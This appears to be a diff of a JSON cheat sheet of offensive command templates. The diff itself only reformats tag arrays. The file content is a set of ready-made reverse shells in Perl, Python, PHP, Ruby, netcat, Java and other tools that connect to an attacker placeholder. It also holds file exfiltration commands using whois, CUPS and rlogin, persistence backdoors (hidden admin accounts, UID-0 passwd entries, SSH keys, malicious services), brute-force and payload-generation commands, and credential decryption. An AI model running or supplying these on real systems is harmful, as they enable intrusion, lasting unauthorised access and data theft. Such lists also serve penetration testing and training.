           "description": "Prepared payload for web parameter injection",
           "template": "echo%20%27use%20Socket%3B%24i%3D%22{{ATTACKER_IP}}%22%3B%24p%3D{{PORT}}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew",
-          "tags": ["perl", "reverse", "shell", "urlencoded"]
+          "tags": [
+            "perl",
+            "reverse",
+            "shell",
+            "urlencoded"
+          ]
         },
         {
           "id": "python_reverse_shell",
@@ -1359,7 +2098,12 @@
           "subcategory": "Reverse Shells",
           "description": "Connects back to attacker and redirects IO",
           "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ATTACKER_IP}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-          "tags": ["python", "reverse", "shell", "linux"]
+          "tags": [
+            "python",
+            "reverse",
+            "shell",
+            "linux"
+          ]
         },
         {
           "id": "php_reverse_shell",
@@ -1368,7 +2112,12 @@
           "subcategory": "Reverse Shells",
           "description": "Short PHP reverse shell",
           "template": "php -r '$sock=fsockopen(\"{{ATTACKER_IP}}\",{{PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-          "tags": ["php", "reverse", "shell", "linux"]
+          "tags": [
+            "php",
+            "reverse",
+            "shell",
+            "linux"
+          ]
         },
         {
           "id": "ruby_reverse_shell",
@@ -1377,7 +2126,12 @@
           "subcategory": "Reverse Shells",
           "description": "Ruby reverse shell one-liner",
           "template": "ruby -rsocket -e'f=TCPSocket.open(\"{{ATTACKER_IP}}\",{{PORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-          "tags": ["ruby", "reverse", "shell", "linux"]
+          "tags": [
+            "ruby",
+            "reverse",
+            "shell",
+            "linux"
+          ]
         },
         {
           "id": "nc_no_e_shell",
@@ -1386,7 +2140,13 @@
           "subcategory": "Reverse Shells",
           "description": "Reverse shell when Netcat does not support the -e option",
           "template": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{ATTACKER_IP}} {{PORT}} > /tmp/f",
-          "tags": ["netcat", "nc", "reverse", "shell", "bypass"]
+          "tags": [
+            "netcat",
+            "nc",
+            "reverse",
+            "shell",
+            "bypass"
+          ]
         },
         {
           "id": "nc_pipe_shell",
@@ -1395,7 +2155,13 @@
           "subcategory": "Reverse Shells",
           "description": "Uses a pipe construct if nc -e is not available",
           "template": "nc {{ATTACKER_IP}} {{PORT}} | /bin/sh | nc {{ATTACKER_IP}} 444",
-          "tags": ["netcat", "nc", "shell", "bypass", "pipe"]
+          "tags": [
+            "netcat",
+            "nc",
+            "shell",
+            "bypass",
+            "pipe"
+          ]
         },
         {
           "id": "telnet_pipe_shell",
@@ -1404,7 +2170,12 @@
           "subcategory": "Reverse Shells",
           "description": "Uses a pipe construct with telnet if nc -e is not available",
           "template": "telnet {{ATTACKER_IP}} {{PORT}} | /bin/sh | telnet {{ATTACKER_IP}} 444",
-          "tags": ["telnet", "shell", "bypass", "pipe"]
+          "tags": [
+            "telnet",
+            "shell",
+            "bypass",
+            "pipe"
+          ]
         },
         {
           "id": "java_reverse_shell",
@@ -1413,7 +2184,11 @@
           "subcategory": "Reverse Shells",
           "description": "Java snippet for a reverse shell",
           "template": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{{ATTACKER_IP}}/{{PORT}};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
-          "tags": ["java", "reverse", "shell"]
+          "tags": [
+            "java",
+            "reverse",
+            "shell"
+          ]
         },
         {
           "id": "xterm_reverse_shell",
@@ -1422,7 +2197,12 @@
           "subcategory": "Reverse Shells",
           "description": "Redirects XTerm to attacker display",
           "template": "xterm -display {{ATTACKER_IP}}:1",
-          "tags": ["xterm", "reverse", "shell", "linux"]
+          "tags": [
+            "xterm",
+            "reverse",
+            "shell",
+            "linux"
+          ]
         },
         {
           "id": "jdwp_rce",
@@ -1431,7 +2211,12 @@
           "subcategory": "Exploit Development",
           "description": "Java Debug Wire Protocol Remote Code Execution snippet",
           "template": "print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(\"whoami\").getInputStream())).readLine())",
-          "tags": ["java", "jdwp", "rce", "exploit"]
+          "tags": [
+            "java",
+            "jdwp",
+            "rce",
+            "exploit"
+          ]
         },
         {
           "id": "msfvenom_payload",
@@ -1440,7 +2225,12 @@
           "subcategory": "Payload Generation",
           "description": "Creates a C-format Windows reverse TCP payload with Shikata_ga_nai",
           "template": "msfvenom -p windows/shell_reverse_tcp LHOST={{ATTACKER_IP}} LPORT={{PORT}} -f c -a x86 --platform windows -b \"\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai",
-          "tags": ["msfvenom", "payload", "windows", "exploit"]
+          "tags": [
+            "msfvenom",
+            "payload",
+            "windows",
+            "exploit"
+          ]
         },
         {
           "id": "py_to_exe",
@@ -1449,7 +2239,12 @@
           "subcategory": "Payload Generation",
           "description": "Compiles a Python script into a Windows executable",
           "template": "python pyinstaller.py --onefile {{SOURCE_FILE}}",
-          "tags": ["python", "pyinstaller", "exe", "windows"]
+          "tags": [
+            "python",
+            "pyinstaller",
+            "exe",
+            "windows"
+          ]
         },
         {
           "id": "bad_chars_python",
@@ -1458,7 +2253,12 @@
           "subcategory": "Exploit Development",
           "description": "Creates a string of all possible bad characters for buffer overflows",
           "template": "python3 -c \"print('\\\\'.join([ 'x{:02x}'.format(i) for i in range(1,256) ]))\"",
-          "tags": ["buffer overflow", "badchars", "python", "exploit"]
+          "tags": [
+            "buffer overflow",
+            "badchars",
+            "python",
+            "exploit"
+          ]
         },
         {
           "id": "pattern_create",
@@ -1467,7 +2267,12 @@
           "subcategory": "Exploit Development",
           "description": "Generates a unique string to find the EIP offset",
           "template": "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {{LENGTH}}",
-          "tags": ["metasploit", "buffer overflow", "eip", "pattern"]
+          "tags": [
+            "metasploit",
+            "buffer overflow",
+            "eip",
+            "pattern"
+          ]
         },
         {
           "id": "pattern_offset",
@@ -1476,7 +2281,12 @@
           "subcategory": "Exploit Development",
           "description": "Calculates the exact EIP offset from a crash value",
           "template": "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {{EIP_VALUE}}",
-          "tags": ["metasploit", "buffer overflow", "eip", "pattern"]
+          "tags": [
+            "metasploit",
+            "buffer overflow",
+            "eip",
+            "pattern"
+          ]
         },
         {
           "id": "compile_windows_on_linux",
@@ -1485,7 +2295,12 @@
           "subcategory": "Exploit Development",
           "description": "Cross-compilation of C source code to Windows EXE",
           "template": "i686-w64-mingw32-gcc {{SOURCE_FILE}} -lws2_32 -o {{OUTPUT_FILE}}",
-          "tags": ["gcc", "mingw", "compile", "windows"]
+          "tags": [
+            "gcc",
+            "mingw",
+            "compile",
+            "windows"
+          ]
         },
         {
           "id": "compile_linux",
@@ -1494,7 +2309,11 @@
           "subcategory": "Exploit Development",
           "description": "Compiles C source code to Linux ELF binary (32/64 bit)",
           "template": "gcc -m32|-m64 -o {{OUTPUT_FILE}} {{SOURCE_FILE}}",
-          "tags": ["gcc", "compile", "linux"]
+          "tags": [
+            "gcc",
+            "compile",
+            "linux"
+          ]
         },
         {
           "id": "compile_nasm_windows_obj",
@@ -1503,7 +2322,12 @@
           "subcategory": "Exploit Development",
           "description": "Compiles ASM code to an object file using NASM",
           "template": "nasm -f win64 {{SOURCE_FILE}} -o {{OBJECT_FILE}}",
-          "tags": ["assembly", "nasm", "compile", "windows"]
+          "tags": [
+            "assembly",
+            "nasm",
+            "compile",
+            "windows"
+          ]
         },
         {
           "id": "compile_nasm_windows_exe",
@@ -1512,7 +2336,12 @@
           "subcategory": "Exploit Development",
           "description": "Links an object file to an executable using GoLink",
           "template": "GoLink.exe -o {{OUTPUT_FILE}} {{OBJECT_FILE}}",
-          "tags": ["assembly", "golink", "compile", "windows"]
+          "tags": [
+            "assembly",
+            "golink",
+            "compile",
+            "windows"
+          ]
         }
       ]
     },
@@ -1528,7 +2357,12 @@
           "subcategory": "Online Attacks",
           "description": "Brute-force attack on HTTP POST login forms",
           "template": "hydra {{TARGET_IP}} http-post-form -L {{WORDLIST}} \"/{{ENDPOINT}}:{{USER_FIELD}}=^USER^&{{PASS_FIELD}}=^PASS^:{{FAIL_MESSAGE}}\" -s {{PORT}} -P {{WORDLIST}}",
-          "tags": ["hydra", "bruteforce", "web", "http"]
+          "tags": [
+            "hydra",
+            "bruteforce",
+            "web",
+            "http"
+          ]
         },
         {
           "id": "hydra_protocols",
@@ -1537,7 +2371,13 @@
           "subcategory": "Online Attacks",
           "description": "Brute-force attack on common network protocols",
           "template": "hydra {{TARGET_IP}} -l {{USERNAME}} -P {{WORDLIST}} ftp|ssh|smb://{{TARGET_IP}}",
-          "tags": ["hydra", "bruteforce", "ftp", "ssh", "smb"]
+          "tags": [
+            "hydra",
+            "bruteforce",
+            "ftp",
+            "ssh",
+            "smb"
+          ]
         }
       ]
     },
@@ -1553,7 +2393,12 @@
           "subcategory": "Data Exfiltration",
           "description": "Starts a listener to receive data packaged as a Whois request",
           "template": "nc -l -v -p {{PORT}} | sed \"s/ //g\" | base64 -d",
-          "tags": ["exfiltration", "whois", "listener", "bypass"]
+          "tags": [
+            "exfiltration",
+            "whois",
+            "listener",
+            "bypass"
+          ]
         },
         {
           "id": "whois_exfil_victim",
@@ -1562,7 +2407,12 @@
           "subcategory": "Data Exfiltration",
           "description": "Sends data packaged as a Whois request to the attacker",
           "template": "whois -h {{ATTACKER_IP}} -p {{PORT}} `cat {{FILE_PATH}} | base64`",
-          "tags": ["exfiltration", "whois", "send", "bypass"]
+          "tags": [
+            "exfiltration",
+            "whois",
+            "send",
+            "bypass"
+          ]
         },
         {
           "id": "cancel_exfil",
@@ -1571,7 +2421,11 @@
           "subcategory": "Data Exfiltration",
           "description": "Uses the CUPS cancel command for data exfiltration",
           "template": "cancel -u \"$(cat {{FILE_PATH}})\" -h {{ATTACKER_IP}}:{{PORT}}",
-          "tags": ["exfiltration", "cancel", "cups"]
+          "tags": [
+            "exfiltration",
+            "cancel",
+            "cups"
+          ]
         },
         {
           "id": "rlogin_exfil",
@@ -1580,7 +2434,10 @@
           "subcategory": "Data Exfiltration",
           "description": "Uses rlogin for data exfiltration",
           "template": "rlogin -l \"$(cat {{FILE_PATH}})\" -p {{PORT}} {{ATTACKER_IP}}",
-          "tags": ["exfiltration", "rlogin"]
+          "tags": [
+            "exfiltration",
+            "rlogin"
+          ]
         },
         {
           "id": "win_create_user",
@@ -1589,7 +2446,12 @@
           "subcategory": "Persistence",
           "description": "Creates a new user and adds to Administrators group",
           "template": "net user {{USERNAME}} {{PASSWORD}} /add && net localgroup Administrators {{USERNAME}} /add",
-          "tags": ["windows", "persistence", "user", "admin"]
+          "tags": [
+            "windows",
+            "persistence",
+            "user",
+            "admin"
+          ]
         },
         {
           "id": "win_hide_user",
@@ -1598,7 +2460,13 @@
           "subcategory": "Persistence",
           "description": "Hides a specific user from the Windows login screen via Registry",
           "template": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v {{USERNAME}} /d 0 /f",
-          "tags": ["windows", "persistence", "user", "hide", "registry"]
+          "tags": [
+            "windows",
+            "persistence",
+            "user",
+            "hide",
+            "registry"
+          ]
         },
         {
           "id": "win_persistence_service_cmd",
@@ -1607,7 +2475,12 @@
           "subcategory": "Persistence",
           "description": "Creates a malicious service running as LocalSystem via CMD",
           "template": "sc create {{SERVICE_NAME}} binpath= \"{{FILE_PATH}} {{ATTACKER_IP}} {{PORT}} -e C:\\WINDOWS\\System32\\cmd.exe\" obj= \"LocalSystem\" password= \"\"",
-          "tags": ["windows", "persistence", "service", "sc"]
+          "tags": [
+            "windows",
+            "persistence",
+            "service",
+            "sc"
+          ]
         },
         {
           "id": "win_persistence_service_ps",
@@ -1616,7 +2489,12 @@
           "subcategory": "Persistence",
           "description": "Creates a malicious service running as LocalSystem via PowerShell",
           "template": "New-Service -Name {{SERVICE_NAME}} -DisplayName {{SERVICE_NAME}} -BinaryPathName \"{{FILE_PATH}}\" -Description \"Not at all\"",
-          "tags": ["windows", "persistence", "service", "powershell"]
+          "tags": [
+            "windows",
+            "persistence",
+            "service",
+            "powershell"
+          ]
         },
         {
           "id": "win_scheduled_task",
@@ -1625,7 +2503,12 @@
           "subcategory": "Persistence",
           "description": "Schedules a malicious EXE to run every 10 minutes",
           "template": "schtasks /create /sc minute /mo 10 /tn \"{{SERVICE_NAME}}\" /tr {{FILE_PATH}}",
-          "tags": ["windows", "persistence", "schtasks", "schedule"]
+          "tags": [
+            "windows",
+            "persistence",
+            "schtasks",
+            "schedule"
+          ]
         },
         {
           "id": "linux_ssh_keys",
@@ -1634,7 +2517,12 @@
           "subcategory": "Persistence",
           "description": "Adds own public key to root for persistent access",
           "template": "mkdir /root/.ssh 2>/dev/null; echo '{{SSH_PUBLIC_KEY}}' >> /root/.ssh/authorized_keys",
-          "tags": ["linux", "persistence", "ssh", "keys"]
+          "tags": [
+            "linux",
+            "persistence",
+            "ssh",
+            "keys"
+          ]
         },
         {
           "id": "linux_backdoor_user",
@@ -1643,7 +2531,12 @@
           "subcategory": "Persistence",
           "description": "Adds a user with UID 0 (root) to /etc/passwd",
           "template": "echo '{{USERNAME}}::0:0:root:/root:/bin/bash' >> /etc/passwd",
-          "tags": ["linux", "persistence", "passwd", "backdoor"]
+          "tags": [
+            "linux",
+            "persistence",
+            "passwd",
+            "backdoor"
+          ]
         },
         {
           "id": "decrypt_rdg_passwords",
@@ -1652,7 +2545,12 @@
           "subcategory": "Credential Access",
           "description": "Decrypts passwords from Remote Desktop Connection Manager",
           "template": "Copy-Item 'C:\\Program Files (x86)\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.exe C:\\temp\\RDCMan.dll’; Import-Module C:\\temp\\RDCMan.dll; $EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings; [RdcMan.Encryption]::DecryptString({{PASSWORD}}, $EncryptionSettings)",
-          "tags": ["windows", "rdcman", "passwords", "decrypt"]
+          "tags": [
+            "windows",
+            "rdcman",
+            "passwords",
+            "decrypt"
+          ]
         },
         {
           "id": "decrypt_vnc_password",
@@ -1661,7 +2559,12 @@
           "subcategory": "Credential Access",
           "description": "Extracts and decrypts VNC passwords",
           "template": "wine vncpwdump.exe -k {{PASSWORD}}",
-          "tags": ["vnc", "password", "decrypt", "wine"]
+          "tags": [
+            "vnc",
+            "password",
+            "decrypt",
+            "wine"
+          ]
         }
       ]
     }
